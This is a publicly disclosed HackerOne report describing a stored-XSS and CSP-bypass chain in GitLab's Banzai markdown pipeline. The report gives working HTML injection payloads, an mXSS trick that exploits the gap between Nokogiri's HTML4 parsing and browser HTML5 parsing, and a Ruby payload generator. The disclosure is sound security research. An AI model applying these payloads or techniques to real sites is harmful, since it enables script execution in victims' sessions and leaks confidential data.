# Stored-XSS injected in Wiki page via Banzai pipeline

## Report Details
- **Report ID**: 2257080
- **URL**: https://hackerone.com/reports/2257080
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-11-19T11:54:19.399Z
- **Disclosed**: 2024-05-28T08:11:19.325Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Hello,

I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.

# Reproduce

- Create a new project.
- Got to its `Wikis`, `Create your first page` button, then fill the form:
   + Title: `_sidear`
   + Content: please see in `_sidebar.md` attached file ({F2868304})

{F2868305}

   + click `Create page` to save the wiki page
   + after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`
   + **Note:** you will not see the alert if you are the person who can access to the Gitlab confidential issue `https://gitlab.com/gitlab-org/gitlab/-/issues/428268` which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)


# Impact

Stored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.

# TL;DR

## 1. `gsub`
 
The vulnerable code is as the following:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116
        def call
          ...
          link_pattern_start = /\A#{link_pattern}/
          ...
          nodes.each_with_index do |node, index|
            ...
            elsif element_node?(node)
              yield_valid_link(node) do |link, inner_html|
                ...
                if link == inner_html && inner_html =~ link_pattern_start
                  replace_link_node_with_text(node, index) do
                    object_link_filter(inner_html, link_pattern, link_reference: true)
                  end


# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182
       def object_link_filter(text, pattern, link_content: nil, link_reference: false)
          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|
            ...
            if object
              ... 
              link = ...

# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38
    def references_in(text, pattern = object_class.reference_pattern)
          text.gsub(pattern) do |match|
            if ident = identifier($~)
              yield match, ident, $~[:project], $~[:namespace], $~
            else
              match
            end
          end
        end
```

I'm not sure for which reason `link_pattern_start` is used to check **only** the prefix of `link_pattern` (not the whole) in the first function of the listing above. And latter the `link_pattern` is used in `gsub` to replace **any** occurrences in the third function. Consider the following HTML snippet:

```html
<a href="LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>">LINK_PATTERN<a alt='"LINK_PATTERN'></a></a>
```

The second replacement of `LINK_PATTERN` will expanse the corresponding information into `alt` attribute. This information will never be redacted as it tag `<a>` does not have `class = gfm`. This can be used to disclose titles of private  [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

For example, open an issue with the following content (we need `<i>` tag to have  nested `<a>` tags):

- input:
```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>
```

- output: we can get the title of Gitlab's confidential issue 428268:


{F2868307}


## 2. `&quot;`

Now if we replace single quot by double one, and add `href` attribute as the following:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href="//xxx" alt="https://gitlab.com/gitlab-org/gitlab/-/issues/428268"></a></i></a></dl>
```

We get the result:

{F2868306}

Because the second replacement of `LINK_PATTERN` broke down the double quotes of `alt` to introduce other attributes. The result was latter redacted by:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66
  def redacted_node_content(node)
      original_content = node.attr('data-original')
      original_content = CGI.escape_html(original_content) if original_content

      original_link =
        if node.attr('data-link-reference') == 'true'
          href = node.attr('href')

          %(<a href="#{href}">#{original_content}</a>)
        end

      original_link || original_content || node.inner_html
    end
```

This means that if we can inject `&quot;` in to the `href` attribute, then we can break it.

Fortunately, the [Sanitize](https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40) is here and it replaces `"` by `%22` in the `href` attribute.

```ruby
# https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40

  # Mapping of original characters to escape sequences for characters that
  # should be escaped in attributes affected by unsafe libxml2 behavior.
  UNSAFE_LIBXML_ESCAPE_CHARS = {
    ' ' => '%20',
    '"' => '%22'
  }
```


Any users' direct input of `href` is sanitized but not the `href` which are generated by other HTML filters. One of them is [GollumTagsFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/gollum_tags_filter.rb#L141). 

If we provide the following input:

```
[[a|http:'"&lt;]]
```

then we get:

```html
<a rel="nofollow noreferrer noopener" class="gfm" href="http:'&quot;&lt;" target="_blank">a</a>
```


So fare, we can introduce any attribute into `<a>` tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing `href`). 

For example:

- input:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'"yvvdwf=here&gt;&lt;img/src="0"onerror="alert(0)"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl> 
```

- output:

```html
<dl>&#x000A;<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href="http:'" yvvdwf="here"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>" class="gfm"&gt;a</i>&#x000A;</dl>
```

## 3. mXSS

The backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as `/`.

For example, this snippet `<img/src="0"onerror="alert(0)">` will give different result:
- `<img>` at the backend {F2868308}
- `<img src="0" onerror="alert(0)">` at the browser

As we can inject any tag, we use `<style>` to keep inside the snippet which will be sent to browser as-is:

```html
<style><img/src="0"onerror="alert(0)"></style>
```

Finally, to be able to get the `<img>` tag back, we put all of them inside `<svg>` tag:

```html
<svg><style><img/src="0"onerror="alert(0)"></style></svg>
```

At the browser, the`<img>` tag  is mutated to get outside of `<svg>` context. Thus we get the following result:

```html
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

Until here, we can inject any tag with any attribute. By using the basic payload `<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>` we can get XSS.

## payload

This is a small Ruby snippet to generate the payload:

```ruby
def gen_payload( payload, based_url: "https://gitlab.com/gitlab-org/gitlab/-/issues/428268")
  payload    = "#{payload}#{based_url}" unless payload.include? based_url
  payload    = payload.gsub('<', '&lt;').gsub('>', '&gt;')

  es_payload = %(*<i><a href="http:#{ payload.gsub('"','&quot;') }" class="gfm">a</a></i>)
  es_payload = CGI.escape_html( es_payload ).gsub('%20', '%2520') #double encode space/tab/new_line

  a = %(<dl><a href="#{ based_url }#{ es_payload }">#{ based_url }*<i>[[a|http:#{ payload }]]</i></a></dl>)
  puts a
end

gen_payload %('"><svg><style>dl{visibility:hidden}<i/class=gl-show-field-errors><input/title="<script>alert(document.domain)</script>"/></style></svg>)
```

Best regards,
yvvdwf

## Impact

Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.

## Attachments
- _sidebar.md
- 0.sidebar.png
- 2.breakdown.png
- 1.disclosure.png
- nokogiri-html4.png
